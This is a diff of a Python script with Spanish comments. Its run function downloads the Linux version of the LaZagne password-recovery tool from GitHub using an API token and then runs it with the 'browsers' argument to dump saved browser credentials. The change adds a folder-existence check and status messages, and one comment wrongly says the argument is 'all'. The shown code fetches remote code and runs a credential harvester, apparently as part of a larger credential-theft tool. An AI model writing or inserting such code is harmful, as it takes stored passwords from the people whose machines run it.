@@ -28,8 +28,17 @@ def downloadFile(urlb, token, path):
 def run(token):
     urlb = "https://api.github.com/repos/AlessandroZ/LaZagne/contents/Linux/"
     path = 'Linux'
-    os.makedirs(path, exist_ok=True)
-    downloadFile(urlb, token, path)
-    subprocess.run(["python3", os.path.join(path, 'laZagne.py'), "browsers"], check=True)
+    
+    # Verificar si la carpeta ya existe
+    if not os.path.exists(path):
+        os.makedirs(path, exist_ok=True)
+        # Descargar el directorio
+        downloadFile(urlb, token, path)
+        # Ejecutar el archivo con el argumento "all"
+        print('[!] Ejecutando laZagne.py')
+        subprocess.run(["python3", os.path.join(path, 'laZagne.py'), "browsers"], check=True)
+    else:
+        print('[!] La carpeta Linux ya existe, no se descargará nada.')
+        subprocess.run(["python3", os.path.join(path, 'laZagne.py'), "browsers"], check=True)
 
 
